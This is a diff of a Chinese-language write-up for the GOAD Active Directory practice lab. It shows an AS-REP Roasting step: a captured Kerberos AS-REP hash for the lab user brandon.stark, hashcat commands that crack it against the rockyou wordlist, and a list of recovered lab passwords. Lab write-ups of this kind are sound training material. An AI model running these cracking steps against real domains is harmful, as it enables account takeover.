@@ -874,7 +874,11 @@ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:30a743660db54d8c4207ddead8
 GetNPUsers摘要:
 >这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。
 
-hashcat破解
+hashcat破解[brandon.stark.hash](https://github.com/N1etzsche0/GOAD/blob/main/GOAD-Part3-Find-User/Workspace/brandon.stark.hash)
 ```bash
-./hashcat.bin -m18200 '$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:6c40c1569d7d9bda2eeebca93e7c3b4d$ee84863d7ed647f92f68bc6888d202f86e06bedd84ee0eaa96c9a01e32cc99a01e2da9786775cf4c815ff5fa89e0d9ef7251d4ccf6765824cef1c7f21cd127c4a0c0a526c9adb4909b2d747c788bbfb30aad9d2f40fd8bef7a9906be11c095532bcb4856fd64c7955e82949dda366a70febbd7ce8b45bd809c40caeb02e3e9bede478361705bdac54ba59e3abec5a2b619ece365987504b1fc2ec82276ae3b197dc688e09944ace8743dd975868ff5f338cc9bb385c1ef5d263c4e93854140e22aec344e09d25127b95fd123c7e788a34438082ceea6190923bd02e3a263287ed082e0df732f3644e84497ee3d5ff6a3d97567f9f437621be5756154c76f38e45f6c220d1f1a' ../../rockyou.txt --force
+hashcat -a 0 -m 18200 brandon.stark.hash /usr/share/wordlists/rockyou.txt
 ```
+现在已经知道的域的用户和密码:
+* samwell.tarly:Heartsbane(用户描述)
+* brandon.stark:iseedeadpeople(AS-REP Roasting)
+
